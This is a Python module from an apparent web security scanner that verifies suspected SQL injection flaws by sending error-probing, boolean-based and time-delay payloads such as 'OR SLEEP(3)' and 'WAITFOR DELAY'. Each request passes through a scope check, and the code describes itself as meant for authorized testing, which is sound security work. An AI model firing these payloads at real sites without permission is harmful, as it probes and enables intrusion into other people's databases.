"""SQL injection verification helpers for authorized testing."""

from __future__ import annotations

from dataclasses import asdict, dataclass
import time
from typing import Any

import requests

from fuzzing.fuzzer import build_param_url
from utils.scope_checker import ScopeChecker, ScopeError


ERROR_PATTERNS = (
    "sql syntax",
    "mysql",
    "mariadb",
    "postgresql",
    "sqlite",
    "odbc",
    "jdbc",
    "ora-",
    "unclosed quotation",
    "syntax error",
)

TIME_PAYLOADS = ("' OR SLEEP(3)--", '"; WAITFOR DELAY \'0:0:3\'--')
BOOLEAN_TRUE = "1' AND 1=1--"
BOOLEAN_FALSE = "1' AND 1=2--"


@dataclass(frozen=True)
class SQLiVerification:
    """One SQLi verification result."""

    param: str
    url: str
    confirmed: bool
    confidence: str
    checks: tuple[str, ...]
    evidence: str
    source: str = "ACTIVE"


def _get(
    url: str,
    timeout: float,
    proxies: dict[str, str] | None,
    verify: bool | str,
    scope_checker: ScopeChecker | None,
) -> tuple[int | None, str, float, str | None]:
    start = time.perf_counter()
    try:
        if scope_checker:
            scope_checker.require_in_scope(url, "SQLi verification request")
        response = requests.get(
            url,
            timeout=timeout,
            allow_redirects=False,
            headers={"User-Agent": "MiniReconSQLiVerifier/3.0"},
            proxies=proxies,
            verify=verify,
        )
        elapsed = time.perf_counter() - start
        return response.status_code, response.text, elapsed, None
    except (requests.RequestException, ScopeError) as exc:
        elapsed = time.perf_counter() - start
        return None, "", elapsed, str(exc)


def verify_sqli_finding(
    finding: dict[str, Any],
    timeout: float = 8.0,
    proxies: dict[str, str] | None = None,
    verify: bool | str = True,
    scope_checker: ScopeChecker | None = None,
) -> dict[str, Any]:
    """Verify one possible SQLi finding using error, boolean, and timing checks."""

    base_url = str(finding.get("url", ""))
    param = str(finding.get("param", ""))
    checks: list[str] = []
    evidence: list[str] = []

    if not base_url or not param:
        return asdict(SQLiVerification(param, base_url, False, "NONE", tuple(checks), "missing URL or parameter"))

    status, body, _, error = _get(base_url, timeout, proxies, verify, scope_checker)
    if error:
        return asdict(SQLiVerification(param, base_url, False, "NONE", tuple(checks), error))

    lowered = body.lower()
    if any(pattern in lowered for pattern in ERROR_PATTERNS):
        checks.append("error-based")
        evidence.append(f"database error text observed with status {status}")

    true_url = build_param_url(base_url, param, BOOLEAN_TRUE)
    false_url = build_param_url(base_url, param, BOOLEAN_FALSE)
    true_status, true_body, _, _ = _get(true_url, timeout, proxies, verify, scope_checker)
    false_status, false_body, _, _ = _get(false_url, timeout, proxies, verify, scope_checker)
    if true_status != false_status or abs(len(true_body) - len(false_body)) > max(100, int(len(true_body) * 0.20)):
        checks.append("boolean-based")
        evidence.append("true/false payloads produced different response status or length")

    baseline_status, _, baseline_time, _ = _get(build_param_url(base_url, param, "1"), timeout, proxies, verify, scope_checker)
    for payload in TIME_PAYLOADS:
        time_status, _, elapsed, _ = _get(build_param_url(base_url, param, payload), timeout + 4, proxies, verify, scope_checker)
        if baseline_status == time_status and elapsed - baseline_time >= 2.0:
            checks.append("time-based")
            evidence.append(f"time payload delayed response by {elapsed - baseline_time:.2f}s")
            break

    if len(checks) >= 2:
        confidence = "HIGH"
    elif checks:
        confidence = "MEDIUM"
    else:
        confidence = "LOW"
    return asdict(
        SQLiVerification(
            param=param,
            url=base_url,
            confirmed=bool(checks),
            confidence=confidence,
            checks=tuple(checks),
            evidence="; ".join(evidence) if evidence else "no SQLi verification signal observed",
        )
    )
